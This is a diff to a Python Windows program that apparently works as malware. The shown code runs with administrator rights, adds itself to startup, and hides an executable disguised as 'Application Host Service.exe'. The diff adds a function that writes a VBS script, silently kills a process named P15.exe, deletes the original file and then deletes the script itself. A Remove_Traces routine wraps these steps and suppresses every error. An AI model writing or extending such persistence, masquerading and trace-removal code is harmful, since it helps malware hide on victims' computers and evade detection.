@@ -5,7 +5,7 @@ import ctypes
 import winreg
 import sys
 import psutil
-
+import subprocess
 
 #Ask For Run As Administrator
 def run_as_admin():
@@ -57,14 +57,32 @@ if run_as_admin():
         except Exception as e:
             # print(f"Error adding to startup: {e}")
             pass
+    def Delete_File(DriveLetter,File_Path):
+        Bat_File=rf"{DriveLetter}del.vbs"
+        with open(Bat_File,"w") as File:
+            File.write(rf"""Set objShell = CreateObject("WScript.Shell")
+objShell.Run "taskkill /F /IM P15.exe", 0, True
+objShell.Run "cmd /c del {File_Path}", 0, True
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+objFSO.DeleteFile WScript.ScriptFullName
+""")
+        subprocess.run(["cscript.exe", "//Nologo", Bat_File], shell=True)
+            
     def Remove_Traces(Drive_Letter):
-        # Hide The File
-        Exe_Path=rf"{Drive_Letter}\Application Host Service.exe"
-        os.system(f"attrib +h \"{Exe_Path}\"")
-        # Delete The File
-        script_path = sys.argv[0]
-        absolute_path = os.path.abspath(script_path)
-        os.remove(absolute_path)
+        try:
+            # Hide The File
+            Exe_Path=rf"{Drive_Letter}\Application Host Service.exe"
+            os.system(f"attrib +h \"{Exe_Path}\"")
+
+            # Delete The File
+            absolute_path = os.path.abspath(sys.argv[0])
+            Delete_File(Drive_Letter,absolute_path)
+
+        except Exception as g:
+            pass
+            # print(g)
+
+        
 
 
     #  list_drive_letters Fuction 💠
